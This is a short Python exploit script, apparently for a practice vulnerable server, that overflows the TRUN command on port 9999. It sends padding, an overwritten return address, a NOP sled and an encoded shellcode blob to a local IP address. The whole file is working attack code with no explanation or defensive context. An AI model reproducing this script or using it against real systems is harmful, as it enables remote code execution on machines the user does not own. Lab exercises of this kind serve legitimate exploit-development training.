import socket

import sys

buff ="TRUN /.:/"

buff += "A" * 515 + "\xF3\x12\x17\x31" + "\x90" * 16

buff += b"\xda\xde\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x30\xbe\xb4"
buff += b"\xe3\x2d\x9e\x83\xea\xfc\x31\x72\x14\x03\x72\xa0\x01"
buff += b"\xd8\x62\x20\x47\x23\x9b\xb0\x28\xad\x7e\x81\x68\xc9"
buff += b"\x0b\xb1\x58\x99\x5e\x3d\x12\xcf\x4a\xb6\x56\xd8\x7d"
buff += b"\x7f\xdc\x3e\xb3\x80\x4d\x02\xd2\x02\x8c\x57\x34\x3b"
buff += b"\x5f\xaa\x35\x7c\x82\x47\x67\xd5\xc8\xfa\x98\x52\x84"
buff += b"\xc6\x13\x28\x08\x4f\xc7\xf8\x2b\x7e\x56\x73\x72\xa0"
buff += b"\x58\x50\x0e\xe9\x42\xb5\x2b\xa3\xf9\x0d\xc7\x32\x28"
buff += b"\x5c\x28\x98\x15\x51\xdb\xe0\x52\x55\x04\x97\xaa\xa6"
buff += b"\xb9\xa0\x68\xd5\x65\x24\x6b\x7d\xed\x9e\x57\x7c\x22"
buff += b"\x78\x13\x72\x8f\x0e\x7b\x96\x0e\xc2\xf7\xa2\x9b\xe5"
buff += b"\xd7\x23\xdf\xc1\xf3\x68\xbb\x68\xa5\xd4\x6a\x94\xb5"
buff += b"\xb7\xd3\x30\xbd\x55\x07\x49\x9c\x33\xd6\xdf\x9a\x71"
buff += b"\xd8\xdf\xa4\x25\xb1\xee\x2f\xaa\xc6\xee\xe5\x8f\x39"
buff += b"\xa5\xa4\xb9\xd1\x60\x3d\xf8\xbf\x92\xeb\x3e\xc6\x10"
buff += b"\x1e\xbe\x3d\x08\x6b\xbb\x7a\x8e\x87\xb1\x13\x7b\xa8"
buff += b"\x66\x13\xae\xcb\xe9\x87\x32\x0c"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:

	s.connect(('192.168.1.16', 9999))

except:

	print "Error"

	sys.exit(0)

s.recv(1024)

s.send(buff)

